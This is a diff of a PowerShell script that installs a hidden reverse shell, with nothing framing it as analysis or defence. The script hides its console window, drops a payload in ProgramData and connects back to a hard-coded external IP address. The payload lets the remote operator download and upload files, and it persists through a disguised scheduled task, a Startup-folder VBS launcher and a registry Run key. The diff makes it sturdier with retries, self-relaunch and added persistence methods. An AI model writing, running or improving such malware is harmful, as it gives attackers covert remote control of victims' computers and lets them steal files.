@@ -1,49 +1,74 @@
-# Completely hide PowerShell window from the start
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
+# Error logging function
+function Write-ErrorLog {
+    param([string]$ErrorMessage)
+    $desktopPath = [Environment]::GetFolderPath("Desktop")
+    $errorFile = Join-Path $desktopPath "script_errors.txt"
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "[$timestamp] ERROR: $ErrorMessage"
+    Add-Content -Path $errorFile -Value $logEntry
+}
 
-# Paths for persistence
-$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$persistentPath = "C:\ProgramData\SystemShell.ps1"
-$vbsPath = Join-Path $startupPath "SystemRun.vbs"
-$wscriptPath = Join-Path $env:TEMP "RunHidden.js"
+try {
+    # Check if running as administrator
+    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+        Write-ErrorLog "This script requires Administrator privileges. Please run as Administrator."
+        exit 1
+    }
 
-# Create JavaScript file for completely hidden execution (better than VBS)
-$jsContent = @"
-var oShell = new ActiveXObject("WScript.Shell");
-oShell.Run('powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"$persistentPath\"', 0, false);
-"@
+    # Completely hide PowerShell window
+    try {
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        ' -ErrorAction SilentlyContinue
+        
+        $consolePtr = [Console.Window]::GetConsoleWindow()
+        if ($consolePtr -ne [IntPtr]::Zero) {
+            [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
+        }
+    } catch {
+        Write-ErrorLog "Failed to hide window: $($_.Exception.Message)"
+    }
 
-Set-Content -Path $wscriptPath -Value $jsContent -Force
+    # Paths for persistence
+    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $programDataPath = "C:\ProgramData"
+    $persistentPath = Join-Path $programDataPath "SystemShell.ps1"
+    $vbsPath = Join-Path $startupPath "SystemRun.vbs"
+    
+    # Ensure ProgramData directory exists
+    try {
+        if (-not (Test-Path $programDataPath)) {
+            New-Item -ItemType Directory -Path $programDataPath -Force | Out-Null
+        }
+    } catch {
+        Write-ErrorLog "Failed to create directory: $($_.Exception.Message)"
+    }
 
-# Create the persistent reverse shell script with improved hiding
-$reverseShellScript = @'
-# Enhanced hidden reverse shell
+    # Create the persistent reverse shell script
+    $reverseShellScript = @'
+# Enhanced hidden reverse shell with error handling
 try {
     # Hide window immediately
-    Add-Type -Name Window -Namespace Console -MemberDefinition '
-    [DllImport("Kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-    '
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
-    
-    # Additional hiding method
-    if ($consolePtr -ne [IntPtr]::Zero) {
-        [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
-    }
-    
+    try {
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        ' -ErrorAction SilentlyContinue
+        $consolePtr = [Console.Window]::GetConsoleWindow()
+        if ($consolePtr -ne [IntPtr]::Zero) {
+            [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
+        }
+    } catch { }
+
     # TCP Connection parameters
     $ip = "143.110.191.171"
-    $port = 4443
+    $port = 4444
+    $retryInterval = 10
     
     function Start-ReverseShell {
         while($true) {
@@ -61,7 +86,7 @@ try {
                     if($command -eq "exit") { break }
                     if($command -eq "quit") { return }
                     
-                    # Handle special commands
+                    # Handle download command
                     if($command.StartsWith("download ")) {
                         $file = $command.Substring(9)
                         if(Test-Path $file) {
@@ -77,6 +102,7 @@ try {
                         continue
                     }
                     
+                    # Handle upload command
                     if($command.StartsWith("upload ")) {
                         $parts = $command.Split(' ', 3)
                         if($parts.Length -eq 3) {
@@ -106,39 +132,77 @@ try {
                 $stream.Close()
                 $client.Close()
             } catch {
-                Start-Sleep -Seconds 10
+                Start-Sleep -Seconds $retryInterval
             }
         }
     }
     
     Start-ReverseShell
 } catch {
-    # Silent fail - no window popup
+    Start-Sleep -Seconds 30
+    PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$persistentPath"
 }
 '@
 
-# Save persistent script
-Set-Content -Path $persistentPath -Value $reverseShellScript -Force
+    # Save persistent script
+    try {
+        Set-Content -Path $persistentPath -Value $reverseShellScript -Force -Encoding UTF8
+    } catch {
+        Write-ErrorLog "Failed to create persistent script: $($_.Exception.Message)"
+        throw
+    }
 
-# Create scheduled task for startup (more reliable and hidden)
-$taskName = "WindowsSystemUpdate"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+    # Method 1: Scheduled Task
+    try {
+        $taskName = "WindowsSystemUpdate"
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        
+        # Unregister if exists
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
+        
+        # Register new task
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+    } catch {
+        Write-ErrorLog "Scheduled task creation failed: $($_.Exception.Message)"
+    }
 
-# Also create WScript launcher for immediate execution
-$wscriptContent = @"
+    # Method 2: Startup Folder
+    try {
+        $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$persistentPath""", 0, False
 "@
+        Set-Content -Path $vbsPath -Value $vbsContent -Force
+    } catch {
+        Write-ErrorLog "Startup entry creation failed: $($_.Exception.Message)"
+    }
 
-Set-Content -Path $vbsPath -Value $wscriptContent -Force
+    # Method 3: Registry Run Key
+    try {
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "WindowsSystemUpdate"
+        $regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
+        
+        if (Test-Path $regPath) {
+            Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
+        }
+    } catch {
+        Write-ErrorLog "Registry entry creation failed: $($_.Exception.Message)"
+    }
 
-# Start immediately using WScript (completely hidden)
-Start-Process -FilePath "wscript.exe" -ArgumentList "//B", "`"$wscriptPath`"" -WindowStyle Hidden
+    # Start the reverse shell immediately
+    try {
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`"" -WindowStyle Hidden
+    } catch {
+        Write-ErrorLog "Failed to start reverse shell: $($_.Exception.Message)"
+    }
 
-# Cleanup temporary files
-Start-Sleep -Seconds 3
-Remove-Item -Path "$env:TEMP\persist.ps1" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path $wscriptPath -Force -ErrorAction SilentlyContinue
+} catch {
+    Write-ErrorLog "Critical error in main script: $($_.Exception.Message)"
+}
+
+# Keep the script running briefly
+Start-Sleep -Seconds 5
